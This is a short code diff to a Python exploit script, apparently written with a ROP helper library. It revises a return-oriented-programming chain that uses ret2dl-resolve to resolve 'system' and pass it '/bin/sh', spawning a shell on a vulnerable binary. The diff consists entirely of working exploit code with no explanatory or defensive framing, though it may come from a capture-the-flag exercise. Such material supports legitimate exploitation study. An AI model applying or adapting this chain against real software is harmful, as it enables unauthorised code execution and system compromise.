@@ -23,7 +23,9 @@ buf = rop.call_chain_ptr(
     ['read', 0, addr_dt_debug, 8],
     [ptr_ret, addr_stage+380]
 )
-buf += rop.dl_resolve(addr_stage + len(buf), 'system')
+buf += rop.dl_resolve_call(addr_stage+300)
+buf += rop.fill(300, buf)
+buf += rop.dl_resolve_data(addr_stage+300, 'system')
 buf += rop.fill(380, buf)
 buf += rop.string('/bin/sh')
 buf += rop.fill(400, buf)
